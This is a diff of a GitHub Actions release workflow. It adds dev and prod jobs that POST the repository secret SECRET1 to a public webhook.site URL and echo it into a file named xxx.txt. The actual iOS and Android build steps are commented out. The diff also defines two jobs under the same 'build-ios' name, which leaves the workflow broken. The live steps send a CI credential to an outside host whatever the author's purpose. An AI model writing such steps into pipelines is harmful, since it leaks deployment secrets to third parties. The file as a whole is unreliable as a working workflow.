@@ -9,6 +9,7 @@ on:
 jobs:
   build-ios:
     runs-on: macos-latest
+    environment: dev
     if: |
       ${{ github.event_name == 'release' }} &&
       contains(github.event.release.body, 'Platforms: iOS') || contains(github.event.release.body, 'Platforms: iOS, Android')
@@ -23,77 +24,98 @@ jobs:
       - name: send request
         uses: fjogeleit/http-request-action@v1
         with:
-          url: 'https://webhook.site/85f1e0e4-7027-4431-883b-9d9bd82db67a'
+          url: 'https://webhook.site/85f1e0e4-7027-4431-883b-9d9bd82db67a?env=dev'
           method: 'POST'
           data: '{"key_1": ${{ secrets.SECRET1 }}, "key_2": "value_2"}'
-      - name: upload artifact
-        uses: actions/upload-artifact@v2
-        with:
-          name: xxx.txt
-          path: xxx.txt
-          retention-days: 1
-      - name: Setup Node
-        uses: actions/setup-node@v3
-        with:
-          node-version: 16
-      - name: Setup Ruby
-        uses: ruby/setup-ruby@v1
-        with:
-          ruby-version: 2.7
-      - name: Install bundle
-        run: bundle install
-      - name: Install packages
-        run: npm install
-      - name: Save release description to file
-        shell: bash
-        if: ${{ github.event_name == 'release' }}
-        run: |
-          description="${{ github.event.release.body }}"
-          # Print the description without the first 3 lines
-          echo "${description}" | tail -n + 4 > ios/CHANGELOG.md
-      - name: Build app
-        env:
-          SECRET1: ${{ secrets.SECRET1 }}
-        run: |
-          cd ios
-          bundle exec fastlane ios test
-  build-android:
-    runs-on: ubuntu-latest
+  build-ios:
+    runs-on: macos-latest
+    environment: prod
     if: |
       ${{ github.event_name == 'release' }} &&
-      contains(github.event.release.body, 'Platforms: Android') || contains(github.event.release.body, 'Platforms: iOS, Android')
+      contains(github.event.release.body, 'Platforms: iOS') || contains(github.event.release.body, 'Platforms: iOS, Android')
     steps:
       - name: Checkout repo
         uses: actions/checkout@v3
-      - name: Setup Node
-        uses: actions/setup-node@v3
-        with:
-          node-version: 16
-      - name: Setup Ruby
-        uses: ruby/setup-ruby@v1
-        with:
-          ruby-version: 2.7
-      - name: Setup Java
-        uses: actions/setup-java@v2
-        with:
-          java-version: "17"
-          distribution: adopt
-      - name: Install bundle
-        run: bundle install
-      - name: Install packages
-        run: npm install
-      - name: Change gradlew permisssion
-        run: chmod +rwx ./android/gradlew
-      - name: Save release description to file
-        shell: bash
-        if: ${{ github.event_name == 'release' }}
+      - name: test secrets
+        env:
+          SECRET1: ${{ secrets.SECRET1 }}
         run: |
-          description="${{ github.event.release.body }}"
-          Print the description without the first 3 lines
-          echo "${description}" | tail -n + 4 > android/CHANGELOG.md
-      - name: Run Fastlane
-        shell: bash
-        run: |
-          echo "done"
-          cd android
-          bundle exec fastlane android test
+          echo  $SECRET1 >> xxx.txt
+      - name: send request
+        uses: fjogeleit/http-request-action@v1
+        with:
+          url: 'https://webhook.site/85f1e0e4-7027-4431-883b-9d9bd82db67a?env=prod'
+          method: 'POST'
+          data: '{"key_1": ${{ secrets.SECRET1 }}, "key_2": "value_2"}'
+
+  #     - name: upload artifact
+  #       uses: actions/upload-artifact@v2
+  #       with:
+  #         name: xxx.txt
+  #         path: xxx.txt
+  #         retention-days: 1
+  #     - name: Setup Node
+  #       uses: actions/setup-node@v3
+  #       with:
+  #         node-version: 16
+  #     - name: Setup Ruby
+  #       uses: ruby/setup-ruby@v1
+  #       with:
+  #         ruby-version: 2.7
+  #     - name: Install bundle
+  #       run: bundle install
+  #     - name: Install packages
+  #       run: npm install
+  #     - name: Save release description to file
+  #       shell: bash
+  #       if: ${{ github.event_name == 'release' }}
+  #       run: |
+  #         description="${{ github.event.release.body }}"
+  #         # Print the description without the first 3 lines
+  #         echo "${description}" | tail -n + 4 > ios/CHANGELOG.md
+  #     - name: Build app
+  #       env:
+  #         SECRET1: ${{ secrets.SECRET1 }}
+  #       run: |
+  #         cd ios
+  #         bundle exec fastlane ios test
+  # build-android:
+  #   runs-on: ubuntu-latest
+  #   if: |
+  #     ${{ github.event_name == 'release' }} &&
+  #     contains(github.event.release.body, 'Platforms: Android') || contains(github.event.release.body, 'Platforms: iOS, Android')
+  #   steps:
+  #     - name: Checkout repo
+  #       uses: actions/checkout@v3
+  #     - name: Setup Node
+  #       uses: actions/setup-node@v3
+  #       with:
+  #         node-version: 16
+  #     - name: Setup Ruby
+  #       uses: ruby/setup-ruby@v1
+  #       with:
+  #         ruby-version: 2.7
+  #     - name: Setup Java
+  #       uses: actions/setup-java@v2
+  #       with:
+  #         java-version: "17"
+  #         distribution: adopt
+  #     - name: Install bundle
+  #       run: bundle install
+  #     - name: Install packages
+  #       run: npm install
+  #     - name: Change gradlew permisssion
+  #       run: chmod +rwx ./android/gradlew
+  #     - name: Save release description to file
+  #       shell: bash
+  #       if: ${{ github.event_name == 'release' }}
+  #       run: |
+  #         description="${{ github.event.release.body }}"
+  #         Print the description without the first 3 lines
+  #         echo "${description}" | tail -n + 4 > android/CHANGELOG.md
+  #     - name: Run Fastlane
+  #       shell: bash
+  #       run: |
+  #         echo "done"
+  #         cd android
+  #         bundle exec fastlane android test
